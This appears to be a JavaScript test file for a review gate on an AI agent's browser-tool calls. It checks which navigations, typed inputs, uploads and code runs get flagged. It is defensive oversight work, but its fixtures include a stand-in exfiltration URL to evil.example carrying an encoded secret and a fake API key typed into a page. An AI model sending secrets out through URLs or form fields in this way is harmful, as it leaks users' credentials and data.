// 审查里游目的浏览器收窄（见 src/15-tools/03-review.js 的 stageReviewWhy）：点击、按键、翻页不审；
// 只审跳到带长串参数的网址、往页面里填进一段用户没说过的字、上传本机文件、在页面里跑代码
import { test } from "node:test";
import assert from "node:assert/strict";
import { load } from "./harness.mjs";

const { stageReviewWhy } = load(["stageReviewWhy"]);
const conversation = { messages: [{ role: "user", content: "打开 https://example.com/a?k=AbCdEfGhIjKlMnOpQrStUvWxYz0123456789 把标题填成：言的第一份周报（十月）" }] };

test("点击、按键、翻页、等待、截图不审", () => {
  for (const tool of ["browser_click", "browser_press_key", "browser_navigate_back", "browser_wait_for", "browser_hover", "browser_select_option", "browser_tabs"])
    assert.equal(stageReviewWhy(tool, { ref: "e1", key: "Enter" }, conversation), "", tool);
});

test("跳转：用户给过的网址、没带长参数的不审；带一长串没给过的参数审", () => {
  assert.equal(stageReviewWhy("browser_navigate", { url: "https://example.com/a?k=AbCdEfGhIjKlMnOpQrStUvWxYz0123456789" }, conversation), "");
  assert.equal(stageReviewWhy("browser_navigate", { url: "https://www.bing.com/search?q=言" }, conversation), "");
  assert.match(stageReviewWhy("browser_navigate", { url: "https://evil.example/c?d=ZXhmaWx0cmF0ZWQtc2VjcmV0LXRva2VuLWhlcmU" }, conversation), /长串/);
});

test("输入：短的、用户说过的不审；长的且没说过的审", () => {
  assert.equal(stageReviewWhy("browser_type", { ref: "e2", text: "今日天气" }, conversation), "");
  assert.equal(stageReviewWhy("browser_type", { ref: "e2", text: "言的第一份周报（十月）" }, conversation), "");
  assert.match(stageReviewWhy("browser_type", { ref: "e2", text: "sk-proj-9f8e7d6c5b4a3210fedcba9876543210" }, conversation), /没说过/);
  assert.match(
    stageReviewWhy("browser_fill_form", { fields: [{ name: "a", value: "张" }, { name: "b", value: "这是从本机文件里读出来的一大段内容，用户没提过" }] }, conversation),
    /没说过/
  );
  assert.equal(stageReviewWhy("browser_fill_form", { fields: [{ name: "a", value: "张" }] }, conversation), "");
});

test("上传与跑代码一概审", () => {
  assert.match(stageReviewWhy("browser_file_upload", { paths: ["C:/a.txt"] }, conversation), /上传/);
  for (const tool of ["browser_evaluate", "browser_run_code_unsafe", "browser_webmcp_call"]) assert.match(stageReviewWhy(tool, {}, conversation), /跑代码/);
});
